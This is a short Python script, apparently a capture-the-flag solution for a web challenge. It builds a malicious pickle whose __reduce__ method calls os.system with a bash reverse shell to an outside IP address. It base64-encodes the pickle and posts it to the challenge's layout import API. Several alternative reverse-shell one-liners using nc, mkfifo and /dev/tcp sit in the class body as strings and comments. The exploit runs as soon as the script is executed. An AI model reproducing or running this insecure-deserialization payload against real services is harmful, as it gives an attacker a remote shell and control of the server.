import pickle
import requests
import base64
import os


def normal_post_request(debug=True):
    my_layout = [
        {'id': 'bocchi', 'left': 350, 'top': 180}

    ]
    print("typeof mylayout:", type(my_layout))
    my_layout = pickle.dumps(my_layout)
    my_layout = base64.b64encode(my_layout)
    my_layout = str(my_layout, 'utf-8')
    print(my_layout)
   
    if debug:
        return
    myobj = {'layout': my_layout}
    url = 'http://ctf.adl.tw:12004/api/import'
    r = requests.post(url, json=myobj)

    return


class RCE:
    def __reduce__(self):
        ######################
        # nc -lvnp 5555
        # py .\web\fukuwarai\port_listener.py
        # netstat -ano

        "mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 87.87.87.87 5408 >/tmp/f"

        "echo \"hello_world\" > /dev/tcp/87.87.87.87/5408"
        "bash &>/dev/tcp/87.87.87.87/5408 <&1"



        "bash -c \"bash &>/dev/tcp/87.87.87.87/5408< &1\""
        "bash -c \"echo \"test\">/dev/tcp/87.87.87.87/5408\""
        
        #######################
        return os.system, ("bash -c \"bash &>/dev/tcp/87.87.87.87/5487<&1\"",)
        

def payload():


    my_layout = [{'id': 'hako01', 'left': 1131, 'top': RCE()}]
    my_layout=base64.b64encode(pickle.dumps(my_layout)).decode()
    print(my_layout)

    myobj = {'layout': my_layout}
    url = 'http://ctf.adl.tw:12004/api/import'
    r = requests.post(url, json=myobj)

    return


payload()
#normal_post_request()


